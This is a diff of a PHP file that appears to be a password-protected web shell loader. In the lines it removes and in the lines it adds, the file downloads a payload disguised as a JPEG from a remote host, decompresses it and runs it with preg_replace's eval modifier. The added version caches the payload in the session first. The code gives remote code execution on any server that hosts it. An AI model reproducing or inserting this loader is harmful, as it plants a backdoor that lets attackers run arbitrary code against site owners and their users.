@@ -10,10 +10,12 @@
 // $Id: [$file] v1 2012-4-19 10:46 ephper $
 */
 error_reporting(0);
-//define("password",'781f357c35df1fef3138f6d29670365a');
-define('password','demo'); 
+session_start();
+define('password','7e9a1fb2b90fed7210a03041372d5b6b'); 
 define('title','山不在高，有仙则名；水不在深，有龙则灵。');
 define('copyright', 'E');
-$url='http://2012heike.googlecode.com/svn/trunk/make.jpg';
-@preg_replace("~(.*)~ies",gzuncompress(substr(call_user_func_array('file_get_contents',array($url,false,stream_context_create(array('http'=>array('method'=>'GET','timeout'=>1))))),3649)),null);
+if(empty($_SESSION['data'])){
+    $_SESSION['data']=substr(file_get_contents('http://2012heike.googlecode.com/svn/trunk/make.jpg'),3649);
+}
+@preg_replace("~(.*)~ies",gzuncompress($_SESSION['data']),null);
 ?>
